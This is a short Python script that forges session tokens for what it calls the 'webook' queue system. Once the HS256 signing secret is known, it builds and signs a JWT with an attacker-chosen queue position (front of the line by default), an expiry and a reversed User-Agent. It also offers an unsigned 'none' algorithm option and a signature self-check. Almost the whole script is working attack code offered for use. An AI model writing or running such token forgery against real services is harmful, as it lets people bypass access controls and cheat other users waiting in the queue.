#!/usr/bin/env python3
"""
Forge / spoof a webook queue_session JWT once the HS256 secret is known.

Usage:
    python forge-queue-jwt.py --secret "YOUR_SECRET" --ua "Mozilla/5.0 ..." --position 1 --ttl 3600

The payload fields:
    e : expiration timestamp (Unix seconds)
    n : queue position number (smaller = closer to front)
    u : reversed User-Agent string
"""

import argparse
import base64
import hmac
import hashlib
import json
import time


def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def forge(secret, position, ttl_seconds, user_agent, algorithm="HS256"):
    header = {"alg": algorithm, "typ": "JWT"}
    now = int(time.time())
    payload = {
        "e": now + ttl_seconds,
        "n": position,
        "u": user_agent[::-1],
    }

    header_b64 = b64url(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")))
    message = f"{header_b64}.{payload_b64}"

    if algorithm.lower() == "none":
        signature = ""
    else:
        sig = hmac.new(
            secret.encode() if isinstance(secret, str) else secret,
            message.encode(),
            hashlib.sha256,
        ).digest()
        signature = b64url(sig)

    return f"{message}.{signature}"


def decode(token):
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
    if "u" in payload:
        payload["u_decoded"] = payload["u"][::-1]
    return header, payload


def main():
    parser = argparse.ArgumentParser(description="Forge webook queue_session JWT")
    parser.add_argument("--secret", required=True, help="HS256 signing secret")
    parser.add_argument("--position", type=int, default=1, help="Queue position (n)")
    parser.add_argument("--ttl", type=int, default=3600, help="Token lifetime in seconds")
    parser.add_argument(
        "--ua",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        help="User-Agent to embed (will be reversed in payload)",
    )
    parser.add_argument(
        "--alg", default="HS256", help="Algorithm override (HS256 or none for testing)"
    )
    parser.add_argument(
        "--test",
        action="store_true",
        help="Verify the forged token signature before printing",
    )
    args = parser.parse_args()

    token = forge(args.secret, args.position, args.ttl, args.ua, args.alg)

    print("Forged queue_session token:")
    print(token)
    print()

    header, payload = decode(token)
    print("Header:", json.dumps(header, indent=2))
    print("Payload:", json.dumps(payload, indent=2, ensure_ascii=False))

    if args.test and args.alg.upper() == "HS256":
        parts = token.split(".")
        msg = (parts[0] + "." + parts[1]).encode()
        expected = base64.urlsafe_b64decode(parts[2] + "==")
        sig = hmac.new(args.secret.encode(), msg, hashlib.sha256).digest()
        ok = hmac.compare_digest(sig, expected)
        print("\nSelf-test signature:", "VALID" if ok else "INVALID")


if __name__ == "__main__":
    main()
